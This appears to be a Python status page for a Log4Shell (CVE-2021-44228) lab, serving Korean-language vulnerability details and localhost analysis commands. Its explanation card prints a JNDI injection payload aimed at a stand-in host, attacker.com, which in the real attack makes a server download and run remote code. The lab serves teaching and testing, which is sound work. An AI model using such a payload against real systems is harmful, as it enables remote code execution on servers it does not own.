#!/usr/bin/env python3
"""
Log4Shell (CVE-2021-44228) 웹 상태 UI
포트 9080에서 서비스 상태 및 취약점 정보를 제공합니다.
"""
import http.server
import socket
import subprocess

HTML = """<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log4Shell CVE-2021-44228</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; }
  .header { background: linear-gradient(135deg, #161b22, #21262d); padding: 24px 32px; border-bottom: 1px solid #30363d; }
  .header h1 { font-size: 1.6rem; color: #ff7b72; }
  .header .cve { font-size: 0.9rem; color: #8b949e; margin-top: 4px; }
  .container { max-width: 900px; margin: 0 auto; padding: 32px 24px; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; margin-bottom: 20px; }
  .card h2 { font-size: 1rem; color: #58a6ff; margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.05em; }
  .status-row { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
  .dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
  .dot-green { background: #3fb950; box-shadow: 0 0 6px #3fb950; }
  .dot-red { background: #f85149; box-shadow: 0 0 6px #f85149; }
  pre { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 16px; font-size: 0.82rem; overflow-x: auto; color: #79c0ff; line-height: 1.6; }
  .cmd { background: #0d1117; border-left: 3px solid #ff7b72; padding: 10px 14px; border-radius: 0 6px 6px 0; font-family: monospace; font-size: 0.85rem; color: #e6edf3; margin: 6px 0; }
  table { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
  td, th { padding: 8px 12px; text-align: left; border-bottom: 1px solid #21262d; }
  th { color: #8b949e; font-weight: 500; }
  .severity { color: #ff7b72; font-weight: 600; }
</style>
</head>
<body>
<div class="header">
  <h1>&#x1F525; Log4Shell</h1>
  <div class="cve">CVE-2021-44228 &nbsp;|&nbsp; Apache Log4j2 원격 코드 실행 취약점</div>
</div>
<div class="container">
  <div class="card">
    <h2>서비스 상태</h2>
    <div class="status-row">
      <div class="dot APP_DOT_CLASS"></div>
      <span>Spring Boot 앱 (내부 포트 18080): <strong>APP_STATUS</strong></span>
    </div>
    <div style="margin-top:8px;font-size:0.85rem;color:#8b949e">
      Log4j 버전: <strong style="color:#ff7b72">2.14.1 (취약)</strong> &nbsp;|&nbsp;
      JDK: <strong style="color:#e6edf3">1.8.0_181</strong>
    </div>
  </div>
  <div class="card">
    <h2>취약점 정보</h2>
    <table>
      <tr><th>항목</th><th>내용</th></tr>
      <tr><td>CVE</td><td>CVE-2021-44228</td></tr>
      <tr><td>CVSS Score</td><td class="severity">10.0 (Critical)</td></tr>
      <tr><td>영향 버전</td><td>Log4j 2.0-beta9 ~ 2.14.1</td></tr>
      <tr><td>공격 유형</td><td>원격 코드 실행 (RCE) via JNDI Lookup</td></tr>
      <tr><td>취약 헤더</td><td>X-Api-Version</td></tr>
    </table>
  </div>
  <div class="card">
    <h2>공격 원리</h2>
    <pre>Log4j가 로그를 기록할 때 특수 문자열을 자동으로 해석하는 취약점.

공격자가 HTTP 헤더에 아래와 같은 페이로드를 삽입:
  X-Api-Version: $[jndi:ldap://attacker.com/exploit]

Log4j가 이 문자열을 로깅하면서 외부 LDAP 서버에 자동 접속,
악성 Java 클래스를 내려받아 서버에서 실행 (RCE).</pre>
  </div>
  <div class="card">
    <h2>분석 명령어 (호스트에서 실행)</h2>
    <div class="cmd">curl -H "X-Api-Version: test" http://localhost:9080/</div>
    <div class="cmd">curl -v -H "X-Api-Version: test" http://localhost:9080/ 2>&1 | grep -i log4j</div>
    <div class="cmd">nmap -p 9080 --script http-headers localhost</div>
  </div>
</div>
</body>
</html>"""

def check_port(port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect(('127.0.0.1', port))
        s.close()
        return True
    except Exception:
        return False

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        app_up = check_port(18080)
        html = HTML
        html = html.replace('APP_DOT_CLASS', 'dot-green' if app_up else 'dot-red')
        html = html.replace('APP_STATUS', '&#x2713; 실행 중' if app_up else '&#x2717; 시작 중...')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 9080), Handler)
    print("Log4Shell web UI: http://0.0.0.0:9080")
    server.serve_forever()
